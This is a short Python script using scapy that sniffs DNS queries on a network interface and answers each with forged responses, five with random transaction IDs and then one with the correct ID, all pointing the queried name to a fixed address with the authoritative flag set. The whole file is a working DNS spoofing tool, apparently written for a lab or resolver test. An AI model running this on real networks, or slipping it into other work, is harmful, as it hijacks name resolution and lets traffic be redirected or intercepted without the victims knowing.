#!/usr/bin/env python3

"""
This script returns DNS responses with wrong TXIDs, then with a correct TXID.
"""

from scapy.all import *
import random

# Set the interface to listen and respond on
net_interface = "eth0"

# Function that replies to DNS query
def dns_reply(packet):

    correct_txid = packet[DNS].id
    txid_list = list()
    for i in range(5):
        txid_list.append(random.randint(0,65536))
    txid_list.append(correct_txid)

    for txid in txid_list:
        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(
            src=packet[Ether].dst,
            dst=packet[Ether].src
            )

        # Construct the IP header by looking at the sniffed packet
        ip = IP(
            src=packet[IP].dst,
            dst=packet[IP].src
            )

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(
            dport=packet[UDP].sport,
            sport=packet[UDP].dport
            )

        # Construct the DNS response by looking at the sniffed packet and manually
        dns = DNS(
            id=int(txid),
            qd=packet[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            rcode=0,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            an=DNSRR(
                rrname=packet[DNS].qd.qname,
                type='A',
                ttl=3600,
                rdata='1.1.1.1')
            )
            
        # Put the full packet together
        response_packet = eth / ip / udp / dns

        # Send the DNS response
        sendp(response_packet, iface=net_interface)

# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
sniff(filter='udp and dst port 53', iface='eth0', store=0, prn=dns_reply)

